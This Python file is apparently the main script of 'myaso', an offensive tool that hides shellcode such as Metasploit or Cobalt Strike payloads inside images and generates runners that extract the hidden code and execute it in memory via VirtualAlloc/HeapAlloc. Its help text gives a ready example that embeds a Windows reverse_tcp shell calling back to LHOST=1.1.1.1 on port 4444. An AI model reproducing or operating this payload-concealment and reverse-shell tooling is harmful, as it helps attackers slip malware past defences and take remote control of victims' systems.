import argparse
import os
import sys
from textwrap import dedent
from functools import partialmethod

from PIL import Image
from bitarray import bitarray
from colorama import init, Style, Fore
from loguru import logger

from src import shellcode, builder
from algorithms import ALGORITHMS, get_algorithm
from src.image_builder import get_image


def embed_sc(args):
    sc = shellcode.from_args(args)
    logger.debug(f'Shellcode: {sc}')

    payload = bitarray()
    payload.frombytes(sc)

    byte_length = len(payload)
    logger.info(f'Payload size: {byte_length} bits (save this number!)')
    logger.debug(f'Algorithm: {args.algorithm}')

    algorithm = get_algorithm(args.algorithm)

    img = get_image(args.src, algorithm, byte_length)
    algorithm.embed(payload, img)

    img.save(args.dst)
    logger.artifact(f'Saved the stego to {Fore.RED}{args.dst}{Style.RESET_ALL}')

    if args.runner_config:
        get_runner(args, BYTE_LENGTH=byte_length, PAYLOAD_SOURCE=os.path.split(args.dst)[1])


def read_sc(args):
    logger.debug(f'Source image: {args.src}')
    logger.debug(f'Algorithm: {args.algorithm}, extracting up to {args.max_bits} bits')

    img = Image.open(args.src)
    algorithm = get_algorithm(args.algorithm)

    payload = algorithm.extract(img, args.max_bits)
    logger.success('Message: {}', payload.tobytes())


def get_runner(args, **kwargs):
    builder.get_runner(args.runner_config, **kwargs)


command_handlers = {
    'embed': embed_sc,
    'read': read_sc,
    'get-runner': get_runner
}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='myaso',
        description='A steganographic shellcode obfuscator. '
                    'The executor reads data from an image and executes it '
                    'using VirtualAlloc/HeapAlloc. '
    )

    parser.add_argument('command', metavar='<command>', help=f'One of {", ".join(command_handlers.keys())}')
    parser.add_argument('--no-banner', action='store_true')

    # embed
    parser.add_argument('-s', '--sc', '--shellcode', dest='sc_file',
                        help='Shellcode file or msf:// payload (-p option)\n'
                             'pass the options in the extra_options arg:\n'
                             'python main.py --sc msf://windows/reverse_tcp -i ... -o ... -- LHOST=1.1.1.1 LPORT=4444'
                        )

    parser.add_argument('-i', dest='src', help='Source image')
    parser.add_argument('-o', dest='dst', help='Destination image')

    # read
    parser.add_argument('--max-bits', type=int, help='Shellcode length')
    parser.add_argument('-a', dest='algorithm',
                        help=f'Algorithm to use. Available options: {", ".join(ALGORITHMS.keys())}')

    # generate
    parser.add_argument('--def', dest='runner_config', help='Runner config')
    parser.add_argument('extra_options', nargs='*',
                        help='Options used when generating a Cobalt or MSF payload')

    parser.add_argument('-v', '--verbose', action='store_true')

    args = parser.parse_args()

    init()
    logger.level('ERROR', icon=r'[-]')
    logger.level('SUCCESS', icon=r'[+]', color='<bold><green>')
    logger.level('DEBUG', icon=r'[*]', color='')
    logger.level('INFO', icon=r'[!]', color='<bold><yellow>')
    logger.level('ARTIFACT', no=1337, icon=f'{Fore.RED}🥩{Style.RESET_ALL}')
    logger.__class__.artifact = partialmethod(logger.__class__.log, 'ARTIFACT')

    logger.remove()
    logger.add(sys.stdout, format='<level>{level.icon}</level> {message}', level='DEBUG' if args.verbose else 'INFO')

    if not args.no_banner:
        print(dedent(f"""                             
            {Fore.RED}88888b.d88b.  888  888  8888b.  .d8888b   .d88b.           
            888 "888 "88b 888  888     "88b 88K      d88""88b          
            888  888  888 888  888 .d888888 "Y8888b. 888  888          
            888  888  888 Y88b 888 888  888      X88 Y88..88P          
            888  888  888  "Y88888 "Y888888  88888P'  "Y88P"           
                               888                                     
            {Style.RESET_ALL}by @adeadfed{Fore.RED}  Y8b d88P                                     
               {Style.RESET_ALL}@harpsiford{Fore.RED} "Y88P"       {Style.RESET_ALL}
               
               
         _._     _,-'""`-._
        (,-.`._,'(       |\`-/|
            `-.-' \ )-`( , ^ ^)  {Fore.YELLOW}.-",,"-.{Style.RESET_ALL}
                  `-    \`_`"'- {Fore.YELLOW}`________`{Style.RESET_ALL}
                                {Fore.RED}<  meat  >{Style.RESET_ALL}
                                {Fore.GREEN}`""\""\"\"""'{Style.RESET_ALL}
                                {Fore.YELLOW}'________'{Style.RESET_ALL}
        """))

    command_handlers[args.command](args)
